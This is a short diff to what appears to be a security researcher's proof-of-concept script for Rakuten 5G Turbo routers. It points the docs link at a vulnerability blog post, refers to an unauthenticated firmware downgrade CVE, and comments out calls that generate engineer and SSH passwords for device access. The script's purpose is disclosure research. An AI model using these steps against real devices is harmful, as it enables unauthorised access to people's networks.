@@ -2,7 +2,7 @@
 # @package   5GturboAPI
 # @author    Samy Younsi - NeroTeam Security Labs <samy@neroteam.com>
 # @license   Proprietary License - All Rights Reserved
-# @docs      https://neroteam.com/blog/
+# @docs      https://neroteam.com/blog/rakuten-5g-turbo-vulnerability
 
 import turboApi
 
@@ -39,14 +39,14 @@ Install/Downgrade firmware image - No auth required - CVE-2024-47865
 """
 BONUS! Generate Engineer Password to get full web access
 """
-response = turboApi.getEngineerPassword(device)
-print(response)
+# response = turboApi.getEngineerPassword(device)
+# print(response)
 
 """
 BONUS! Generate SSH Password to get SSH access, only working by installing debug firmware (e.g. DG2425@2406171559_DG1.3.18.ffw)
 """
-response = turboApi.getSshPassword(device)
-print(response)
+# response = turboApi.getSshPassword(device)
+# print(response)
 
 """
 BONUS! Direclty set new APN from API (can also work with Engineer access)
